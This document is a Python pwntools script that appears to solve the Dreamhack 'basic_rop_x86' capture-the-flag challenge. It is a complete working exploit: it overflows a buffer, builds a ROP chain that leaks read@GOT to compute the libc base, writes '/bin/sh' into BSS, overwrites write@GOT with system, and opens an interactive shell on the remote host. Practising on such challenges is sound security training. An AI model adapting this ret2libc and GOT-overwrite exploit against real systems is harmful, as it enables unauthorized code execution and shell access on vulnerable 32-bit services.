from pwn import *

def slog(name, addr):
        return success(": ".join([name, hex(addr)]))

#context.log_level = 'debug'

p = remote("host3.dreamhack.games", 14432)
#p = process("./basic_rop_x86")
e = ELF("./basic_rop_x86")
libc = ELF("./libc.so.6")


read_plt = e.plt["read"]
read_got = e.got["read"]
write_plt = e.plt["write"]
write_got = e.got["write"]

read_offset = libc.symbols["read"]
system_offset = libc.symbols["system"]

pppr = 0x8048689
bss = e.bss()


# [2] Exploit
payload = b'A' * 72


# read()  -> write(1, read@got, 4)
payload += p32(write_plt)
payload += p32(pppr)
payload += p32(1)
payload += p32(read_got)
payload += p32(4)


# BSS "/bin/sh"  -> read(0, bss, 8)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(bss)
payload += p32(8)


# got overwrite (write -> system) => read(0, write@got, 4)
payload += p32(read_plt)
payload += p32(pppr)
payload += p32(0)
payload += p32(write_got)
payload += p32(4)


# write("/bin/sh") => system("/bin/sh")
payload += p32(write_plt)
payload += b"AAAA"
payload += p32(bss)

p.send(payload)

p.recvuntil(b'A' * 64)
read = u32(p.recvn(4))
lb = read - read_offset
system = lb + system_offset

slog("libc base", lb)
slog("read", read)
slog("system", system)

p.send(b'/bin/sh\x00')
p.sendline(p32(system))
p.interactive()